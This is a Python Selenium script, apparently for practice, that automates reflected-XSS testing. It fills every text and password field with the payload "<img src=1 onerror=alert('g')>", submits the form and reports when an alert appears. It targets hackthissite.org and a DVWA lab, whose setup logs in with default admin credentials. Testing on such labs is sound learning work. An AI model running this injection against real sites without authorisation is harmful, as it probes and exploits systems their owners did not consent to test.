from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import StaleElementReferenceException
from time import sleep


class BotXss:

    def __init__(self, chromeDriverPath, url):
        self.driver = webdriver.Chrome(chromeDriverPath)
        self.driver.get(url)
        self.xssInject()

    def environmentSetUp(self):

        try:
            # Setting up Testing Environment in DVWA

            usrname = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//input[@name='username']"))
            )

            passwd = self.driver.find_element_by_xpath("//input[@name='password']")
            loginBtn = self.driver.find_element_by_xpath("//input[@type='submit']")

            usrname.send_keys("admin")
            passwd.send_keys("password")
            loginBtn.click()

            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//a[@href='security.php']"))
            ).click()

            self.driver.find_element_by_xpath("//select[@name='security']").click()
            self.driver.find_element_by_xpath("//option[@value='high']").click()
            self.driver.find_element_by_xpath("//input[@name='seclev_submit']").click()
            self.driver.find_element_by_xpath("//a[@href='vulnerabilities/xss_r/']").click()

            # End of Setting up Testing Environment in DVWA
        except Exception as e:
            print(e)
            sleep(5)
            self.driver.close()
            self.driver.quit()

    def searchInputElement(self):
        try:
            inputFields = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//input"))
            )

            inputFields = self.driver.find_elements_by_xpath("//input")
            print(f"Found {len(inputFields)} input Field")

            return inputFields

        except Exception as e:
            print(e)
            self.driver.close()
            self.driver.quit()

    def xssInject(self):

        payload = "<img src=1 onerror=alert('g')>"

        try:
            inputFields = self.searchInputElement()
            for inputField in inputFields:
                if inputField.get_attribute("type") == "text" or inputField.get_attribute("type") == "password":
                    inputField.clear()
                    inputField.send_keys(payload)
                    print(f"=> Injecting payload to <input> with attribute 'name': {inputField.get_attribute('name')}")

                elif inputField.get_attribute("type") == "submit":
                    inputField.click()
                    try:
                        WebDriverWait(self.driver, 3).until(EC.alert_is_present(), "Timed out waiting for popup")
                        alert = self.driver.switch_to.alert
                        alert.accept()
                        print("=> *Payload is working for above input fields, xss vulnerability detected")

                    except TimeoutException:
                        print(f"=> Payload is NOT working for above input fields")

        except StaleElementReferenceException:
            pass

        except:
            print("Error occurs during xssInject()")
            Bot.driver.close()
            Bot.driver.quit()


Bot = BotXss(r"chromedriver", "https://www.hackthissite.org/") #http://localhost/dvwa/
#Bot.environmentSetUp()
#Bot.xssInject()

Bot.driver.close()
Bot.driver.quit()